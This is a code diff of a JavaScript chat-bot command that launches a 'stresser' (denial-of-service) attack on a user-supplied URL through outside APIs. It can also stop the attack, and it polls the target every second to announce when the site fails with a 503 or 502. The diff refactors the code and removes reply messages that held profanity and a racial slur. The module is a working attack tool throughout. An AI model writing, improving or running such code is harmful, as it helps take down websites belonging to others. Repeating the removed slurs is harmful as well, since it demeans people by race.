@@ -26,7 +26,9 @@ module.exports.run = async ({ args, chat, font }) => {
     return chat.reply(font.thin("Please provide a URL to attack!"));
   }
 
- 
+  let attackInterval = null;
+  let errorMessageSent = false;
+
   const tryAttack = async (apis, index = 0) => {
     if (index >= apis.length) {
       return chat.reply(
@@ -36,79 +38,85 @@ module.exports.run = async ({ args, chat, font }) => {
       );
     }
 
-
-
-    try { 
-
+    try {
       let response;
+      const isStopCommand = targetUrl.toLowerCase() === "stop";
 
-      const helonegaownersv2 = targetUrl.toLowerCase() === "stop";
-
-      if (!helonegaownersv2) {
+      if (!isStopCommand) {
         const preparingMessage = await chat.reply(
           font.bold("Preparing to attack target...")
         );
+
         response = await axios.get(
           `${apis[index]}/stresser?url=${encodeURIComponent(targetUrl)}`,
-          {
-            timeout: 10000,
-          }
+          { timeout: 10000 }
         );
+
         preparingMessage.delete();
-      }
 
-      if (helonegaownersv2) {
-        response = await axios.get(
-          `${apis[index]}/stop`,
-          {
-            timeout: 10000,
-          }
-        );
+        if (!response.data || response.data.status !== "success") {
+          throw new Error("Attack initiation failed");
+        }
+      } else {
+        response = await axios.get(`${apis[index]}/stop`, { timeout: 10000 });
 
+        // Clear any existing interval
+        if (attackInterval) {
+          clearInterval(attackInterval);
+          attackInterval = null;
+        }
       }
 
       await chat.reply(
         font.thin(response.data.message || "Attack initiated successfully!")
       );
 
-      let errorMessageSent = false;
-      let attackInterval = null;
-
-      attackInterval = setInterval(async () => {
-        if (errorMessageSent) {
-          clearInterval(attackInterval);
-          return;
-        }
-
-        try {
-          await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0]);
-        } catch (error) {
+      // Only start monitoring if it's not a stop command
+      if (!isStopCommand) {
+        attackInterval = setInterval(async () => {
           if (errorMessageSent) {
             clearInterval(attackInterval);
+            attackInterval = null;
             return;
           }
 
-          errorMessageSent = true;
-          clearInterval(attackInterval);
+          try {
+            await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0], {
+              timeout: 5000,
+            });
+          } catch (error) {
+            if (errorMessageSent) {
+              clearInterval(attackInterval);
+              attackInterval = null;
+              return;
+            }
 
-          if (error.response) {
-            if (error.response.status === 503) {
-              await chat.reply(
-                font.thin("Ako importante? putah! Service Unavailable (503).")
-              );
-            } else if (error.response.status === 502) {
-              await chat.reply(
-                font.thin(
-                  "Kamusta negrong may ari bersyong pangalawa! Bad Gateway (502)."
-                )
-              );
+            errorMessageSent = true;
+            clearInterval(attackInterval);
+            attackInterval = null;
+
+            if (error.response) {
+              if (error.response.status === 503) {
+                await chat.reply(
+                  font.thin("Service Unavailable (503).")
+                );
+              } else if (error.response.status === 502) {
+                await chat.reply(
+                  font.thin("Bad Gateway (502).")
+                );
+              }
             }
           }
-        }
-      }, 1000);
+        }, 1000);
+      }
     } catch (error) {
       if (error.code === "ENOTFOUND" || error.code === "ECONNABORTED") {
+        // Retry with the next API
         return tryAttack(apis, index + 1);
+      } else {
+        await chat.reply(
+          font.thin(`Failed to initiate attack: ${error.message}`)
+        );
       }
     }
   };
